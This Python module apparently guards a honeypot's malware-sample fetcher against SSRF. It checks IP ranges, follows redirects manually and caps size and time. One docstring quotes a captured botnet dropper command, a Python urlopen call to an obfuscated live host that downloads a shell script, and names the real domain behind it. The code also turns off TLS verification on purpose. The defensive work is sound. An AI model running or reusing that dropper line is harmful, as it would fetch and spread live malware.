"""SSRF protection for the sandbox fetcher.

Attacker-supplied URLs (from wget/curl commands typed into the honeypot's fake
shell) are fetched by a process that DOES have real internet egress. Without this
guard, an attacker could point that fetch at internal infrastructure instead of
their own malware host — e.g. http://10.20.0.193/ (docker-svc/Traefik) or a cloud
metadata endpoint. Every hostname is resolved and range-checked here BEFORE
connecting, and redirects are followed manually (not via requests' automatic
redirect handling) so each hop gets the same check — a redirect is exactly as
capable of pointing somewhere internal as the original URL.

Known limitation, accepted deliberately rather than silently: this closes the
"URL points directly at an internal IP" and "redirect chain ends up internal"
cases, which cover real-world SSRF against this specific threat model (attackers
handing the honeypot a URL to a plain malware-hosting box). It does NOT close a
DNS-rebinding race where the same hostname resolves to a safe IP at validation
time and a different (internal) IP a split second later at actual connect time —
that requires the attacker to know they're being sandboxed and control DNS TTLs
precisely; closing it fully needs a connection-pinning HTTP client, which is a
reasonable follow-up but isn't v1 scope.
"""

import ipaddress
import socket
import time
from urllib.parse import urlparse, urlunparse

import requests
import urllib3

import config

# Malware-hosting infrastructure routinely runs self-signed or IP-mismatched
# certs — bulletproof hosts don't care about proper TLS, they just need to
# serve a file. Confirmed live: 22 real fetch attempts (against hosts that
# otherwise connect and respond fine) were failing purely on
# SSLCertVerificationError. We're not trusting this host with anything
# (no credentials sent, no cookies kept), and we're not relying on its
# identity for anything downstream — the only thing we do with the response
# is hash and store it for offline analysis, so a MITM'd response is still
# useful signal (someone else's payload), not a security exposure. Verifying
# certs here protects nothing; it only drops real samples.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SSRFBlocked(Exception):
    """Raised when a URL (or a redirect hop) resolves to a disallowed
    address — a genuine security-relevant block, not a network hiccup."""


class DNSResolutionFailed(Exception):
    """Raised when a hostname simply doesn't resolve at all. Deliberately NOT
    an SSRFBlocked subclass — conflating the two (both used to raise the same
    exception) meant dead/sinkholed/mistyped C2 domains were indistinguishable
    from genuine "this points at internal infrastructure" blocks in the
    fetch-attempts log, which is misleading: a domain that doesn't resolve
    isn't a security concern, it's just unreachable right now."""


def _is_disallowed(ip_str):
    ip = ipaddress.ip_address(ip_str)
    return (
        ip.is_private
        or ip.is_loopback
        or ip.is_link_local
        or ip.is_reserved
        or ip.is_multicast
        or ip.is_unspecified
    )


def _strip_backslashes(hostname):
    """Real botnet payloads insert literal backslashes into a domain name to
    dodge naive string-matching detection — confirmed live against a real
    captured cron-persistence dropper
    (python -c "urllib2.urlopen('http://\\\\b.c\\l\\u-e\\.e\\u/t.sh')"):
    the literal hostname never resolves, but stripping every backslash
    produces 'b.clu-e.eu', which resolves to a real, live IP. Only tried as a
    fallback after the literal hostname has already failed."""
    return hostname.replace("\\", "")


def resolve_and_check(hostname):
    """Resolves hostname to its IPs and raises SSRFBlocked if ANY resolved
    address is private/loopback/link-local/reserved, or DNSResolutionFailed
    if it doesn't resolve at all (after a backslash-stripped retry). Returns
    (ips, hostname) — hostname is echoed back unchanged unless the
    backslash-stripped fallback is what actually resolved, in which case the
    caller needs the corrected hostname to fetch from."""
    try:
        infos = socket.getaddrinfo(hostname, None)
    except socket.gaierror as e:
        if "\\" in hostname:
            stripped = _strip_backslashes(hostname)
            try:
                infos = socket.getaddrinfo(stripped, None)
                hostname = stripped
            except socket.gaierror:
                raise DNSResolutionFailed(
                    f"DNS resolution failed for {hostname!r} "
                    f"(also tried backslash-stripped {stripped!r}): {e}"
                )
        else:
            raise DNSResolutionFailed(f"DNS resolution failed for {hostname!r}: {e}")

    ips = sorted({info[4][0] for info in infos})
    if not ips:
        raise DNSResolutionFailed(f"DNS resolution returned no addresses for {hostname!r}")

    for ip_str in ips:
        if _is_disallowed(ip_str):
            raise SSRFBlocked(f"{hostname!r} resolves to disallowed address {ip_str}")

    return ips, hostname


def _check_url(url):
    """Returns the URL to actually fetch — normally the input unchanged, but
    rewritten to use the de-obfuscated hostname when resolve_and_check had to
    fall back to one."""
    parsed = urlparse(url)
    if parsed.scheme not in config.ALLOWED_SCHEMES:
        raise SSRFBlocked(f"disallowed scheme {parsed.scheme!r} in {url!r}")
    if not parsed.hostname:
        raise SSRFBlocked(f"no hostname in {url!r}")
    # .port raises a bare ValueError for a malformed/out-of-range port (e.g.
    # "http://evil.com:99999999/x") — confirmed live as a real gap: that
    # ValueError wasn't caught by any of fetcher.py's except clauses, so a
    # single crafted URL escaped _process_url entirely and blocked the
    # watermark from ever advancing past it, silently re-crashing the whole
    # poll loop on every cycle. Validate eagerly and turn it into an ordinary
    # SSRFBlocked outcome instead.
    try:
        port = parsed.port
    except ValueError as e:
        raise SSRFBlocked(f"invalid port in {url!r}: {e}")
    _, resolved_hostname = resolve_and_check(parsed.hostname)
    if resolved_hostname == parsed.hostname:
        return url

    netloc = resolved_hostname
    if port:
        netloc += f":{port}"
    if parsed.username:
        userinfo = parsed.username + (f":{parsed.password}" if parsed.password else "")
        netloc = f"{userinfo}@{netloc}"
    return urlunparse(parsed._replace(netloc=netloc))


def safe_get(url, max_bytes):
    """GETs a URL with SSRF protection on the initial URL and every redirect hop,
    a hard byte cap enforced during streaming (not trusting Content-Length), and
    a capped, manually-walked redirect chain. Returns (final_url, content_bytes).
    Raises SSRFBlocked, DNSResolutionFailed, or requests.RequestException on
    any failure."""
    current_url = url
    for hop in range(config.MAX_REDIRECTS + 1):
        current_url = _check_url(current_url)

        resp = requests.get(
            current_url,
            stream=True,
            allow_redirects=False,
            verify=False,
            timeout=(config.FETCH_CONNECT_TIMEOUT, config.FETCH_READ_TIMEOUT),
            headers={"User-Agent": "Mozilla/5.0"},
        )

        if resp.is_redirect or resp.status_code in (301, 302, 303, 307, 308):
            location = resp.headers.get("Location")
            resp.close()
            if not location:
                raise SSRFBlocked(f"redirect with no Location header from {current_url!r}")
            if hop == config.MAX_REDIRECTS:
                raise SSRFBlocked(f"too many redirects starting from {url!r}")
            current_url = requests.compat.urljoin(current_url, location)
            continue

        resp.raise_for_status()
        chunks = []
        total = 0
        # FETCH_READ_TIMEOUT only bounds the gap BETWEEN chunks — a fully
        # attacker-controlled dropzone can trickle bytes just under that gap
        # forever and hold the whole (synchronous, single-threaded) fetch
        # loop hostage, since nothing else runs while this is in progress.
        # This bounds the total time regardless of how steadily bytes arrive.
        deadline = time.monotonic() + config.FETCH_TOTAL_TIMEOUT_SECONDS
        try:
            for chunk in resp.iter_content(chunk_size=65536):
                if time.monotonic() > deadline:
                    raise SSRFBlocked(
                        f"response from {current_url!r} exceeded "
                        f"{config.FETCH_TOTAL_TIMEOUT_SECONDS}s total fetch deadline"
                    )
                total += len(chunk)
                if total > max_bytes:
                    raise SSRFBlocked(
                        f"response from {current_url!r} exceeded {max_bytes} byte cap"
                    )
                chunks.append(chunk)
        finally:
            resp.close()

        return current_url, b"".join(chunks)

    raise SSRFBlocked(f"too many redirects starting from {url!r}")
